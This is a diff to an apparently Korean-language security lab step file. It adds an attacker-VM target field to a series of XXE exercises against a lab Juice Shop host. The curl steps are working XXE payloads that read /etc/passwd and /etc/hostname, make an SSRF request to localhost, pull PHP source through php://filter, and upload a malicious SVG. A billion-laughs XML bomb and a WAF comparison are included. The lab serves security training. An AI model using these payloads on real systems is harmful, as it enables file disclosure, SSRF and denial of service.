@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: api
     field: stdout
+  target_vm: attacker
   script: 'curl -s http://10.20.30.80:3000/api/ && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<test>1</test>'' -o /dev/null -w ''%{http_code}'''
   risk_level: low
 - order: 2
@@ -37,6 +38,7 @@ steps:
     type: output_contains
     expect: ENTITY xxe SYSTEM
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/xxe_basic.xml << 'XMLEOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<comment><text>&xxe;</text></comment>\n\
     XMLEOF\ncat /tmp/xxe_basic.xml && echo '---' && curl -s -X POST http://10.20.30.80:3000/api/Products/ -H 'Content-Type: application/xml' -d @/tmp/xxe_basic.xml"
   risk_level: medium
@@ -51,6 +53,7 @@ steps:
     type: output_contains
     expect: root
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'''
   risk_level: medium
 - order: 4
@@ -65,6 +68,7 @@ steps:
     type: output_contains
     expect: DVWA
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><comment><text>&xxe;</text></comment>''
     --max-time 10 | head -c 500'
   risk_level: medium
@@ -79,6 +83,7 @@ steps:
     type: output_contains
     expect: php
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/api/Products/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]><comment><text>&xxe;</text></comment>'''
   risk_level: medium
 - order: 6
@@ -94,6 +99,7 @@ steps:
     type: output_contains
     expect: XML Bomb payload saved
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/xxe_bomb.xml << 'XMLEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol3\
     \ \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n]>\n<root>&lol4;</root>\nXMLEOF\necho 'XML Bomb\
     \ payload saved (DO NOT SEND - 학습 목적)' && wc -c /tmp/xxe_bomb.xml"
@@ -110,6 +116,7 @@ steps:
     type: output_contains
     expect: HTTP_CODE
     field: stdout
+  target_vm: attacker
   script: 'curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><login><email>&xxe;</email><password>test</password></login>''
     -w ''\nHTTP_CODE:%{http_code}'''
   risk_level: medium
@@ -126,6 +133,7 @@ steps:
     type: output_contains
     expect: SVG XXE payload
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/xxe.svg << 'SVGEOF'\n<?xml version=\"1.0\"?>\n<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"\
     100\">\n  <text x=\"0\" y=\"20\">&xxe;</text>\n</svg>\nSVGEOF\necho 'SVG XXE payload:' && cat /tmp/xxe.svg && echo '---' && curl -s -X POST http://10.20.30.80:3000/file-upload -F 'file=@/tmp/xxe.svg;type=image/svg+xml'\
     \ -w 'HTTP_CODE:%{http_code}'"
@@ -143,6 +151,7 @@ steps:
     type: output_contains
     expect: ModSecurity
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== ModSecurity (포트 80) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo
     [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'' && echo '''' && echo ''=== JuiceShop 직접 (포트 3000) ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:3000/api/Products/
     -H ''Content-Type: application/xml'' -d ''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><text>&xxe;</text></comment>'''
@@ -199,6 +208,7 @@ steps:
     type: output_contains
     expect: XXE 취약점 진단 보고서
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/xxe_report.txt << ''EOF''
 
     === XXE 취약점 진단 보고서 ===
